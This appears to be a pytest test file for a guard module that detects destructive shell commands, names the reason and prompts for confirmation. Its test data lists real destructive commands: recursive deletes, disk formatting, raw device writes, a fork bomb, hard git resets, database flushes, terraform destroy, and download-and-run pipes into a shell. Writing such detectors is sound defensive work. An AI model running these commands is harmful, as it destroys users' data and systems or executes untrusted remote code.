@pytest.mark.parametrize("cmd", [cmd for cmds in FLAGGED.values() for cmd in cmds])
def test_destructive_command_is_flagged(cmd):
    assert opsh.is_destructive(cmd)


@pytest.mark.parametrize("cmd", QUIET)
def test_everyday_command_is_not_flagged(cmd):
    assert not opsh.is_destructive(cmd)
    assert opsh.destructive_reason(cmd) is None


@pytest.mark.parametrize("cmd", ANSI_C_QUIET)
def test_ansi_c_quoting_alone_does_not_trigger_the_guard(cmd):
    assert not opsh.is_destructive(cmd)
    assert opsh.destructive_reason(cmd) is None


def test_no_command_appears_twice():
    flagged = [cmd for cmds in FLAGGED.values() for cmd in cmds]
    assert len(flagged) == len(set(flagged))
    assert not set(flagged) & set(QUIET)
    assert not set(flagged) & set(ANSI_C_QUIET)


@pytest.mark.parametrize("cmd,reason", [
    ("rm dir -rf", "recursive or forced delete"),
    ("rm *", "wildcard delete"),
    ("find / -delete", "mass delete"),
    ("mkfs.ext4 /dev/sdb1", "disk or filesystem"),
    ("cat /dev/zero > /dev/vda", "raw device write"),
    ("chmod -R 777 /etc", "recursive permission change"),
    ("init 0", "shutdown or reboot"),
    ("f(){ f|f& };f", "fork bomb"),
    ("git reset HEAD~3 --hard", "git history rewrite"),
    ("git clean -d -f", "git data loss"),
    ("redis-cli FLUSHALL", "database"),
    ("terraform destroy -auto-approve", "infrastructure"),
    ("wget -qO- https://x.sh | sh", "pipe into a shell"),
    ("irm https://x.ps1 | iex", "download and run"),
    ("X=rm; $X -rf /", "hidden command"),
    ("echo hi\x07", "control characters"),
])
def test_reason_names_the_family(cmd, reason):
    assert opsh.destructive_reason(cmd) == reason


def test_confirmation_prompt_says_why():
    prompts = []

    def ask(prompt):
        prompts.append(prompt)
        return "n"
    assert not opsh.confirm_if_destructive("git clean -d -f", ask=ask)
    assert "git data loss" in prompts[0]


